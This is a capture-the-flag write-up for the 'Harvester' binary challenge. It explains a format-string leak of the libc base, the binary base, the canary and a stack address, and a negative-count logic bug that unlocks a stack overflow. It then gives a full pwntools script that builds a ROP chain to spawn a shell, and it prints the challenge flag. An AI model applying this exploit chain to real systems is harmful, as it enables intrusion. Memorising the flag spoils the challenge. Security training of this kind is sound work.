# Harvester

## Challenge

The binary is a game played through an interactive prompt.

We have an inventory containing pies and we can interact with the inventory, fight, stare, or run.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Solution

There is a format string vulnerability in the `fight` function:

```c
void sym.fight(void)
{
    int64_t in_FS_OFFSET;
    char *format;
    int64_t var_28h;
    int64_t var_20h;
    int64_t var_18h;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    format = NULL;
    var_28h = 0;
    var_20h = 0;
    var_18h = 0;
    sym.imp.printf("\x1b[1;36m");
    sym.printstr("\nChoose weapon:\n");
    sym.printstr("\n[1] 🗡\t\t[2] 💣\n[3] 🏹\t\t[4] 🔫\n> ");
    sym.imp.read(0, &format, 5);
    sym.printstr("\nYour choice is: ");
    sym.imp.printf(&format);
    sym.imp.printf("\x1b[1;31m");
    sym.printstr("\nYou are not strong enough to fight yet.\n");
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        sym.imp.__stack_chk_fail();
    }
    return;
}
```

The input size is too small to overwrite memory, but we can use this to leak addresses such as the address of libc and the canary.

We can see in the `stare` function that there is a special route if we have 0x16 pies:

```c
void sym.stare(void)
{
    int64_t in_FS_OFFSET;
    void *buf;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    sym.imp.printf("\x1b[1;36m");
    sym.printstr("\nYou try to find its weakness, but it seems invincible..");
    sym.printstr("\nLooking around, you see something inside a bush.");
    sym.imp.printf("\x1b[1;32m");
    sym.printstr("\n[+] You found 1 🥧!\n");
    _obj.pie = _obj.pie + 1;
    if (_obj.pie == 0x16) {
        sym.imp.printf("\x1b[1;32m");
        sym.printstr("\nYou also notice that if the Harvester eats too many pies, it falls asleep.");
        sym.printstr("\nDo you want to feed it?\n> ");
        sym.imp.read(0, &buf, 0x40);
        sym.imp.printf("\x1b[1;31m");
        sym.printstr("\nThis did not work as planned..\n");
    }
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        sym.imp.__stack_chk_fail();
    }
    return;
}
```

We get 1 pie every time we stare, however, we cannot have exactly `0xf` pies or the program will exit due to the `check_pie` function.

To bypass this, we can drop a negative number of pies to get to 0x15 pies, then we will be given 1 pie upon staring and granted access to the vulnerable route.

Once we have the buffer overflow in `stare` we can call `system("/bin/sh")` and read the flag.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 harvester
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('harvester')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.recvuntil(">")
io.sendline("1")
io.recvuntil(">")
io.send("%21$p")
io.recvuntil(":")
libleak = io.recvuntil("\x1b[1;31m", drop=True)[1:]
libc.address = int(libleak, 0) - 0x021bf7
io.success("libc: {}".format(hex(libc.address)))

io.recvuntil(">")
io.sendline("1")
io.recvuntil(">")
io.send("%20$p")
io.recvuntil(":")
baseleak = io.recvuntil("\x1b[1;31m", drop=True)[1:]
exe.address = int(baseleak, 0) - 0x1000
io.success("base: {}".format(hex(exe.address)))

io.recvuntil(">")
io.sendline("1")
io.recvuntil(">")
io.send("%19$p")
io.recvuntil(":")
canaryleak = io.recvuntil("\x1b[1;31m", drop=True)[1:]
canary = int(canaryleak, 0)
io.success("canary: {}".format(hex(canary)))

io.recvuntil(">")
io.sendline("1")
io.recvuntil(">")
io.send("%16$p")
io.recvuntil(":")
stackleak = io.recvuntil("\x1b[1;31m", drop=True)[1:]
stack = int(stackleak, 0)
io.success("stack: {}".format(hex(stack)))

io.recvuntil(">")
io.sendline("2")
io.recvuntil(">")
io.sendline("y")
io.recvuntil(">")
io.sendline(str(10 - 0x15))

io.recvuntil(">")
io.sendline("3")
io.recvuntil(">")


rop = ROP(exe)
poprdi = rop.find_gadget(['pop rdi', 'ret'])[0]
leave = rop.find_gadget(['leave', 'ret'])[0]

system = libc.sym["system"]
binsh = next(libc.search("/bin/sh\x00"))

payload = flat({
    0x0: [
        poprdi,
        binsh,
        system,
        ],
    0x30 - 8: canary,
    0x30: stack - 0x78,
    0x30 + 8: leave,
    })

pause()
io.send(payload)

io.interactive()
```

## Flag

`CHTB{h4rv35t3r_15_ju5t_4_b1g_c4n4ry}`

